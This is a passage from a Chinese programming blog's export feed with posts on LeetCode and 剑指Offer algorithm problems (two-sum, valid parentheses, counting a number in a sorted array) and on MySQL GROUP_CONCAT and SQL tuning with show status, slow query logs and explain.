<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">      <span class="keyword">int</span> cur = nums[left] + nums[right];</span><br><span class="line">      <span class="keyword">if</span> (cur == target) &#123;</span><br><span class="line">        result[<span class="number">0</span>] = nums[left];</span><br><span class="line">        result[<span class="number">1</span>] = nums[right];</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur &gt; target) &#123;</span><br><span class="line">        right--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        left++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p>《剑指offer》</p>
</li>
<li><h4 id="剑指-Offer-57-和为s的两个数字"><a href="#剑指-Offer-57-和为s的两个数字" class="headerlink" title="剑指 Offer 57. 和为s的两个数字"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof/" target="_blank" rel="noopener">剑指 Offer 57. 和为s的两个数字</a></h4></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>offer,leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>20. Valid Parentheses</title>
    <url>/2019/05/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Valid%20Parentheses/</url>
    <content><![CDATA[<p>Given a string containing just the characters ‘(‘, ‘)’, ‘{‘, ‘}’, ‘[‘ and ‘]’, determine if the input string is valid.</p>
<p>An input string is valid if:</p>
<p>Open brackets must be closed by the same type of brackets.<br>Open brackets must be closed in the correct order.<br>Note that an empty string is also considered valid.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;()&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 2:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;()[]&#123;&#125;&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 3:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;(]&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 4:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;([)]&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 5:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;&#123;[]&#125;&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>判断是否串是否以给定的字符成对出现.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>利用栈，遍历字符串,判断存在左括号则入栈右括号,否则则出栈.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">     Stack&lt;Character&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">   <span class="keyword">char</span>[] chars = s.toCharArray();</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">char</span> c : chars)&#123;</span><br><span class="line">     <span class="keyword">if</span> ( c == <span class="string">'('</span>) &#123;</span><br><span class="line">       stack.push(<span class="string">')'</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( c == <span class="string">'['</span>) &#123;</span><br><span class="line">       stack.push(<span class="string">']'</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( c == <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">       stack.push(<span class="string">'&#125;'</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span> <span class="keyword">if</span> (stack.isEmpty() || stack.pop()!= c)&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<p>正则表达式替换给定字符</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isValid</span></span>(s: <span class="type">String</span>): <span class="type">Boolean</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> res = s</span><br><span class="line">    <span class="keyword">while</span> (res.contains(<span class="string">"()"</span>) || res.contains(<span class="string">"&#123;&#125;"</span>) || res.contains(<span class="string">"[]"</span>) ) &#123;</span><br><span class="line">      res = res.replaceAll(<span class="string">"\\(\\)"</span>,<span class="string">""</span>)</span><br><span class="line">      res = res.replaceAll(<span class="string">"\\&#123;\\&#125;"</span>,<span class="string">""</span>)</span><br><span class="line">      res = res.replaceAll(<span class="string">"\\[\\]"</span>,<span class="string">""</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    res.equals(<span class="string">""</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/valid-parentheses/" target="_blank" rel="noopener">valid-parentheses</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL group_concat函数详解</title>
    <url>/2018/06/15/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/MySQL%20group_concat%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>以Mysql5.7为例.<br>group_concat属于聚合函数的一种.group_concat是返回结果集合用”,”<br>拼接,如果为空值返回null.</p>
<blockquote>
<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><ul>
<li>语法</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GROUP_CONCAT([DISTINCT] expr [,expr ...]</span><br><span class="line">             [ORDER BY &#123;unsigned_integer | col_name | expr&#125;</span><br><span class="line">                 [ASC | DESC] [,col_name ...]]</span><br><span class="line">             [SEPARATOR str_val])</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>示例</li>
</ul>
</blockquote>
<ol>
<li>查看所有数据</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> sys_user;</span><br></pre></td></tr></table></figure>
<pre><code>id  uname      age  
</code></pre><hr>
<pre><code> 1  a         (NULL)
 2  a         (NULL)
 3  b         (NULL)
 4  d         (NULL)
 5  c         (NULL)
 6  e         (NULL)
 7  g         (NULL)
 8  f         (NULL)
 9  f         (NULL)
</code></pre><ol>
<li>将用户名拼接返回</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">GROUP_CONCAT</span>(uname) <span class="keyword">FROM</span> sys_user ;</span><br></pre></td></tr></table></figure>
<h2 id="group-concat-uname"><a href="#group-concat-uname" class="headerlink" title="group_concat(uname)  "></a>group_concat(uname)  </h2><p>a,a,b,d,c,e,g,f,f    </p>
<p>3.用户名去重后拼接排序</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> uname <span class="keyword">ORDER</span> <span class="keyword">BY</span> uname <span class="keyword">ASC</span>) <span class="keyword">FROM</span> sys_user ;</span><br></pre></td></tr></table></figure>
<h2 id="GROUP-CONCAT-distinct-uname-order-by-uname-ASC"><a href="#GROUP-CONCAT-distinct-uname-order-by-uname-ASC" class="headerlink" title="GROUP_CONCAT(distinct uname order by uname ASC)  "></a>GROUP_CONCAT(distinct uname order by uname ASC)  </h2><p>a,b,c,d,e,f,g       </p>
<ol>
<li>用户名用指定连接符拼接</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> uname <span class="keyword">ORDER</span> <span class="keyword">BY</span> uname SEPARATOR <span class="string">'|'</span>) <span class="keyword">FROM</span> sys_user ;</span><br></pre></td></tr></table></figure>
<h2 id="GROUP-CONCAT-DISTINCT-uname-ORDER-BY-uname-SEPARATOR-‘-’"><a href="#GROUP-CONCAT-DISTINCT-uname-ORDER-BY-uname-SEPARATOR-‘-’" class="headerlink" title="GROUP_CONCAT(DISTINCT uname ORDER BY uname SEPARATOR ‘|’)  "></a>GROUP_CONCAT(DISTINCT uname ORDER BY uname SEPARATOR ‘|’)  </h2><p>a|b|c|d|e|f|g                                              </p>
<blockquote>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1></blockquote>
<p>group_concat默认长度为1024,如果长度超过默认长度会截取返回。根据业务需要,更改长度即可.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> [<span class="keyword">GLOBAL</span> | <span class="keyword">SESSION</span>] group_concat_max_len = val;</span><br></pre></td></tr></table></figure>
<p>返回值是非二进制或二进制字符串，具体取决于参数是非二进制还是二进制字符串。<br>结果类型为TEXT或BLOB,除非group_concat_max_len小于或等于512,在这种情况下,结果类型为VARCHAR或VARBINARY.</p>
<blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/group-by-functions.html#function_group-concat" target="_blank" rel="noopener">Mysql官网group_concat</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指 Offer 53 - I. 在排序数组中查找数字 I</title>
    <url>/2021/04/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/offer/SearchNumberInSortArray/</url>
    <content><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">统计一个数字在排序数组中出现的次数。</span><br></pre></td></tr></table></figure>
<h2 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums = [5,7,7,8,8,10], target = 8</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<h2 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums = [5,7,7,8,8,10], target = 6</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 &lt;= 数组长度 &lt;= 50000</span><br></pre></td></tr></table></figure>
<h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><p>题目首先可以想到的是暴力枚举，但是题目给定了一个有序数组就想到用二分查找。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h2><p>暴力枚举最简单，但是时间复杂度为O(n)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] == target) &#123;</span><br><span class="line">        p++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><p>题目想考察的就是用二分法实现,时间复杂度为O(logn)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">search1</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">      <span class="keyword">int</span> mid = (left + right + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">        left = mid + <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">        right = mid - <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">          <span class="keyword">if</span> (nums[left] == target) &#123;</span><br><span class="line">            p++;</span><br><span class="line">          &#125;</span><br><span class="line">          left++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>《剑指offer》</li>
<li><a href="https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/" target="_blank" rel="noopener">剑指 Offer 53 - I. 在排序数组中查找数字 I</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>offer,leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL sql优化的一般步骤</title>
    <url>/2018/12/21/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/MySQL%20sql%E4%BC%98%E5%8C%96%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<p>MySQL随着数据量的增多,遇到SQL执行缓慢的问题越来越多。文中介绍几种常用的SQL优化的一般步骤.</p>
<ol>
<li>show status</li>
<li>explain</li>
<li>show profile</li>
<li>trace<a id="more"></a>
</li>
</ol>
<h1 id="show-status"><a href="#show-status" class="headerlink" title="show status"></a>show status</h1><p>show status 主要是查看各种类型的操作的执行次数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW STATUS LIKE &apos;COM%&apos;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Variable_name	Value</span><br><span class="line">Com_admin_commands	0</span><br><span class="line">Com_alter_db	0</span><br><span class="line">Com_alter_db_upgrade	0</span><br><span class="line">Com_alter_event	0</span><br><span class="line">Com_alter_function	0</span><br><span class="line">Com_alter_procedure	0</span><br><span class="line">Com_alter_server	0</span><br><span class="line">Com_alter_table	0</span><br><span class="line">Com_alter_tablespace	0</span><br><span class="line">Com_analyze	0</span><br><span class="line">Com_assign_to_keycache	0</span><br><span class="line">Com_begin	0</span><br><span class="line">Com_binlog	0</span><br><span class="line">Com_call_procedure	0</span><br><span class="line">Com_change_db	1</span><br><span class="line">Com_change_master	0</span><br><span class="line">Com_check	0</span><br><span class="line">Com_checksum	0</span><br><span class="line">Com_commit	0</span><br><span class="line">Com_compound_sql	0</span><br><span class="line">Com_create_db	0</span><br><span class="line">Com_create_event	0</span><br><span class="line">Com_create_function	0</span><br><span class="line">Com_create_index	0</span><br><span class="line">Com_create_procedure	0</span><br><span class="line">Com_create_role	0</span><br><span class="line">Com_create_server	0</span><br><span class="line">Com_create_table	0</span><br><span class="line">Com_create_temporary_table	0</span><br><span class="line">Com_create_trigger	0</span><br><span class="line">Com_create_udf	0</span><br><span class="line">Com_create_user	0</span><br><span class="line">Com_create_view	0</span><br><span class="line">Com_dealloc_sql	0</span><br><span class="line">Com_delete	0</span><br><span class="line">Com_delete_multi	0</span><br><span class="line">Com_do	0</span><br><span class="line">Com_drop_db	0</span><br><span class="line">Com_drop_event	0</span><br><span class="line">Com_drop_function	0</span><br><span class="line">Com_drop_index	0</span><br><span class="line">Com_drop_procedure	0</span><br><span class="line">Com_drop_role	0</span><br><span class="line">Com_drop_server	0</span><br><span class="line">Com_drop_table	0</span><br><span class="line">Com_drop_temporary_table	0</span><br><span class="line">Com_drop_trigger	0</span><br><span class="line">Com_drop_user	0</span><br><span class="line">Com_drop_view	0</span><br><span class="line">Com_empty_query	0</span><br><span class="line">Com_execute_sql	0</span><br><span class="line">Com_flush	0</span><br><span class="line">Com_get_diagnostics	0</span><br><span class="line">Com_grant	0</span><br><span class="line">Com_grant_role	0</span><br><span class="line">Com_ha_close	0</span><br><span class="line">Com_ha_open	0</span><br><span class="line">Com_ha_read	0</span><br><span class="line">Com_help	0</span><br><span class="line">Com_insert	0</span><br><span class="line">Com_insert_select	0</span><br><span class="line">Com_install_plugin	0</span><br><span class="line">Com_kill	0</span><br><span class="line">Com_load	0</span><br><span class="line">Com_lock_tables	0</span><br><span class="line">Com_optimize	0</span><br><span class="line">Com_preload_keys	0</span><br><span class="line">Com_prepare_sql	0</span><br><span class="line">Com_purge	0</span><br><span class="line">Com_purge_before_date	0</span><br><span class="line">Com_release_savepoint	0</span><br><span class="line">Com_rename_table	0</span><br><span class="line">Com_rename_user	0</span><br><span class="line">Com_repair	0</span><br><span class="line">Com_replace	0</span><br><span class="line">Com_replace_select	0</span><br><span class="line">Com_reset	0</span><br><span class="line">Com_resignal	0</span><br><span class="line">Com_revoke	0</span><br><span class="line">Com_revoke_all	0</span><br><span class="line">Com_revoke_role	0</span><br><span class="line">Com_rollback	0</span><br><span class="line">Com_rollback_to_savepoint	0</span><br><span class="line">Com_savepoint	0</span><br><span class="line">Com_select	0</span><br><span class="line">Com_set_option	2</span><br><span class="line">Com_show_authors	0</span><br><span class="line">Com_show_binlog_events	0</span><br><span class="line">Com_show_binlogs	0</span><br><span class="line">Com_show_charsets	0</span><br><span class="line">Com_show_collations	0</span><br><span class="line">Com_show_contributors	0</span><br><span class="line">Com_show_create_db	0</span><br><span class="line">Com_show_create_event	0</span><br><span class="line">Com_show_create_func	0</span><br><span class="line">Com_show_create_proc	0</span><br><span class="line">Com_show_create_table	0</span><br><span class="line">Com_show_create_trigger	0</span><br><span class="line">Com_show_databases	1</span><br><span class="line">Com_show_engine_logs	0</span><br><span class="line">Com_show_engine_mutex	0</span><br><span class="line">Com_show_engine_status	0</span><br><span class="line">Com_show_errors	0</span><br><span class="line">Com_show_events	0</span><br><span class="line">Com_show_explain	0</span><br><span class="line">Com_show_fields	1</span><br><span class="line">Com_show_function_status	0</span><br><span class="line">Com_show_generic	0</span><br><span class="line">Com_show_grants	0</span><br><span class="line">Com_show_keys	0</span><br><span class="line">Com_show_master_status	0</span><br><span class="line">Com_show_open_tables	0</span><br><span class="line">Com_show_plugins	0</span><br><span class="line">Com_show_privileges	0</span><br><span class="line">Com_show_procedure_status	0</span><br><span class="line">Com_show_processlist	0</span><br><span class="line">Com_show_profile	0</span><br><span class="line">Com_show_profiles	0</span><br><span class="line">Com_show_relaylog_events	0</span><br><span class="line">Com_show_slave_hosts	0</span><br><span class="line">Com_show_slave_status	0</span><br><span class="line">Com_show_status	2</span><br><span class="line">Com_show_storage_engines	0</span><br><span class="line">Com_show_table_status	0</span><br><span class="line">Com_show_tables	1</span><br><span class="line">Com_show_triggers	0</span><br><span class="line">Com_show_variables	1</span><br><span class="line">Com_show_warnings	0</span><br><span class="line">Com_shutdown	0</span><br><span class="line">Com_signal	0</span><br><span class="line">Com_start_all_slaves	0</span><br><span class="line">Com_start_slave	0</span><br><span class="line">Com_stmt_close	0</span><br><span class="line">Com_stmt_execute	0</span><br><span class="line">Com_stmt_fetch	0</span><br><span class="line">Com_stmt_prepare	0</span><br><span class="line">Com_stmt_reprepare	0</span><br><span class="line">Com_stmt_reset	0</span><br><span class="line">Com_stmt_send_long_data	0</span><br><span class="line">Com_stop_all_slaves	0</span><br><span class="line">Com_stop_slave	0</span><br><span class="line">Com_truncate	0</span><br><span class="line">Com_uninstall_plugin	0</span><br><span class="line">Com_unlock_tables	0</span><br><span class="line">Com_update	0</span><br><span class="line">Com_update_multi	0</span><br><span class="line">Com_xa_commit	0</span><br><span class="line">Com_xa_end	0</span><br><span class="line">Com_xa_prepare	0</span><br><span class="line">Com_xa_recover	0</span><br><span class="line">Com_xa_rollback	0</span><br><span class="line">Com_xa_start	0</span><br><span class="line">Compression	OFF</span><br></pre></td></tr></table></figure>
<p>看几个常用的com_update、com_select、com_insert、com_delete,这些CRUD的次数统计能直观的看到数据库服务是读多、还是写多。可根据具体的业务指定不同的方案。<br>当然对于innodb存储引擎,可查看其对应的信息:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW STATUS LIKE &apos;innodb_rows_%&apos;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Variable_name         Value        </span><br><span class="line">--------------------  -------------</span><br><span class="line">Innodb_rows_deleted   933911       </span><br><span class="line">Innodb_rows_inserted  1715972      </span><br><span class="line">Innodb_rows_read      30210424768  </span><br><span class="line">Innodb_rows_updated   235151</span><br></pre></td></tr></table></figure>
<p>表示对应的操作影响的行数。这样的话,数据库的读多写少的类型会看的更直观。也可以直接查询SESSION_STATUS表来查看mysql的统计信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM information_schema.`SESSION_STATUS` s WHERE  s.`VARIABLE_NAME` LIKE &apos;INNODB_ROWS_%&apos;;;</span><br></pre></td></tr></table></figure>
<p>注意区分变量名的大小写。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VARIABLE_NAME         VARIABLE_VALUE  </span><br><span class="line">--------------------  ----------------</span><br><span class="line">INNODB_ROWS_DELETED   933911          </span><br><span class="line">INNODB_ROWS_INSERTED  1716071         </span><br><span class="line">INNODB_ROWS_READ      30211179934     </span><br><span class="line">INNODB_ROWS_UPDATED   235155</span><br></pre></td></tr></table></figure>
<h2 id="定位慢查询"><a href="#定位慢查询" class="headerlink" title="定位慢查询"></a>定位慢查询</h2><p>首先要开启慢查询日志,默认是关闭的。<br>默认的慢查询时间为10s，超过这个值的sql会记录到慢查询的日志文件中,可对这些SQL进行对应的优化。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Variable_name	Value</span><br><span class="line">long_query_time	10.000000</span><br><span class="line">slow_query_log	OFF</span><br><span class="line">slow_query_log_file	LAPTOP-3T4D6I5F-slow.log</span><br></pre></td></tr></table></figure></p>
<p>一般用mysqldumpslow工具来分析慢查询日志。</p>
<p>有这两种开启方式:</p>
<ol>
<li>在my.cnf 里 通过 log-slow-queries[=file_name]</li>
<li>在mysqld进程启动时,指定—log-slow-queries[=file_name]</li>
</ol>
<p>我们通过在my.cnf中配置来开启慢查询:<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启用慢查询日志</span></span><br><span class="line"><span class="string">slow_query_log=1</span></span><br><span class="line"><span class="comment">#指定慢查询文件名称</span></span><br><span class="line"><span class="string">slow-query-log-file=mysql-slow.log</span></span><br><span class="line"><span class="comment">#慢查询时间,超过这个值的会记录到慢查询日志中</span></span><br><span class="line"><span class="string">long_query_time=1</span></span><br><span class="line"><span class="comment">#SQL语句检测的记录数少于设定值的语句不会被记录到慢查询日志，即使这个语句执行时间超过了long_query_time的阈值</span></span><br><span class="line"><span class="string">min_examined_row_limit=100</span></span><br></pre></td></tr></table></figure></p>
<p>重启数据库,查看配置参数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Variable_name	Value</span><br><span class="line">long_query_time	1.000000</span><br><span class="line">slow_query_log	ON</span><br><span class="line">slow_query_log_file	mysql-slow.log</span><br></pre></td></tr></table></figure></p>
<p>这样就开启了慢查询日志,通常用mysqldumpslow这个工具来分析慢查询日志信息。</p>
<h2 id="show-processlist"><a href="#show-processlist" class="headerlink" title="show processlist"></a>show processlist</h2><p>慢查询需要等到SQL执行完成后才会写入到日志文件中,要查询当前正在执行的进程、是否锁表等信息慢查询就不行了。需要processlist来查看信息了,当然需要有PROCESS权限才可以看到所有的线程信息，否则只能看到你自己的线程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show  processlit;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Id	User	Host	db	Command	Time	State	Info	Progress</span><br><span class="line">2	root	localhost:10716	\N	Query	0	init	show processlist	0.000</span><br><span class="line">3	root	localhost:10717	\N	Sleep	410		\N	0.000</span><br></pre></td></tr></table></figure>
<h1 id="explain"><a href="#explain" class="headerlink" title="explain"></a>explain</h1><p>通过explain命令来查看SQL的执行计划。语法很简单，explain 要执行的SQL即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM sys_role r,sys_user_role ur WHERE r.id= ur.role_id;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id	select_type	table	type	possible_keys	key	key_len	ref	rows	Extra</span><br><span class="line">1	SIMPLE	r	ALL	PRIMARY	\N	\N	\N	1	</span><br><span class="line">1	SIMPLE	ur	ALL	\N	\N	\N	\N	1	Using where; Using join buffer (flat, BNL join)</span><br></pre></td></tr></table></figure>
<p>返回的信息详解介绍一下，</p>
<h2 id="id"><a href="#id" class="headerlink" title="id"></a>id</h2><p>选择标识符。这是查询中SELECT的序号。如果行引用其他行的并集结果，则该值可以为NULL。在本例中，表列显示了一个值，如<unionm，n>，表示行引用id值为M和N的行的并集。</unionm，n></p>
<h2 id="select-type"><a href="#select-type" class="headerlink" title="select_type"></a>select_type</h2><ol>
<li>SIMPLE(简单SELECT,不使用UNION或子查询等)</li>
<li>PRIMARY(查询中若包含任何复杂的子部分,最外层的select被标记为PRIMARY)</li>
<li>UNION(UNION中的第二个或后面的SELECT语句)</li>
<li>DEPENDENT UNION(UNION中的第二个或后面的SELECT语句，取决于外面的查询)</li>
<li>UNION RESULT(UNION的结果)</li>
<li>SUBQUERY(子查询中的第一个SELECT)</li>
<li>DEPENDENT SUBQUERY(子查询中的第一个SELECT，取决于外面的查询)</li>
<li>DERIVED(派生表的SELECT, FROM子句的子查询)</li>
<li>UNCACHEABLE SUBQUERY(一个子查询的结果不能被缓存，必须重新评估外链接的第一行)</li>
</ol>
<h2 id="table"><a href="#table" class="headerlink" title="table"></a>table</h2><p>涉及的表</p>
<h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>表示MySQL在表中找到所需行的方式，又称“访问类型”。</p>
<p>常用的类型有： ALL, index,  range, ref, eq_ref, const, system, NULL（从左到右，性能从差到好）</p>
<ol>
<li><p>ALL：全表扫描, MySQL将遍历全表以找到匹配的行</p>
</li>
<li><p>index: 索引全扫描,index与ALL区别为index类型只遍历索引树</p>
</li>
<li><p>range: 索引范围扫描,常见于&lt; 、&lt;= 、&gt;、&gt;=、between等操作。</p>
</li>
<li><p>ref: 使用非唯一索引扫描或唯一索引的前缀扫描。返回匹配某个单独值的记录行。</p>
</li>
<li><p>eq_ref: 类似ref，区别就在使用的索引是唯一索引，对于每个索引键值，表中只有一条记录匹配，简单来说，就是多表连接中使用primary key或者 unique key作为关联条件</p>
</li>
<li><p>const、system: 单表中最多有一个匹配的行，查询速度很快。所以这个匹配行中的其他列的值可以被优化器在当前查询中当做常量处理。例如使用primary key或者 unique key来查询。</p>
</li>
<li><p>NULL: 表示不用访问表或使用索引就能直接得到结果。</p>
</li>
</ol>
<h2 id="prossible-keys"><a href="#prossible-keys" class="headerlink" title="prossible_keys"></a>prossible_keys</h2><p>可能使用到的索引</p>
<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>实际使用到的索引，没有使用到索引就是NULL</p>
